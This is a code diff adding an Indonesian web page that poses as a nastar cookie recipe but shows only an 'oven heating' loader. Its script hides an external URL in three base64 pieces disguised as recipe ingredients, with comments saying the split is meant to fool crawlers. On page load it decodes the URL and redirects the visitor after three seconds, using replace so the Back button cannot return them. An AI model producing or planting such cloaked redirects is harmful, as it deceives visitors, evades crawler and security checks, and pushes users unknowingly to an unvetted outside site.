@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Resep Rahasia Kue Nastar Lumer</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 50px; background-color: #fffaf0; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #d2691e; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h1>Sedang Memanaskan Oven...</h1>
+    <p>Mohon tunggu 3 detik sementara kami menyiapkan bahan-bahan kue kering terbaik untuk Anda.</p>
+    <div class="loader"></div>
+
+    <script>
+        // Step 1: Definisikan bahan-bahan (Base64 dari https://kupas78.net/cbpb)
+// Kita pecah menjadi 3 bagian agar lebih sulit dibaca oleh crawler
+const tepungTerigu = "aHR0cHM6";      // https:
+const mentegaCair  = "Ly9rdXBhczc4";  // //kupas78
+const gulaHalus    = "Lm5ldC9jYnBi";  // .net/cbpb
+
+// Step 2: Fungsi untuk mengaduk adonan (Decode & Redirect)
+function panggangKue() {
+    // Menggabungkan semua bahan menjadi satu adonan utuh
+    const adonanLengkap = tepungTerigu + mentegaCair + gulaHalus;
+    
+    // Teknik Obfuscation: Mengubah Base64 kembali menjadi teks URL biasa
+    const resepJadi = atob(adonanLengkap);
+    
+    // Step 3: Pengalihan (Redirect) setelah 3 detik (3000 milidetik)
+    setTimeout(() => {
+        // Menggunakan replace agar user tidak bisa kembali ke halaman ini dengan tombol 'Back'
+        window.location.replace(resepJadi);
+    }, 3000); 
+}
+
+// Jalankan fungsi saat halaman selesai dimuat
+window.onload = panggangKue;
+  
+    </script>
+</body>
+</html>
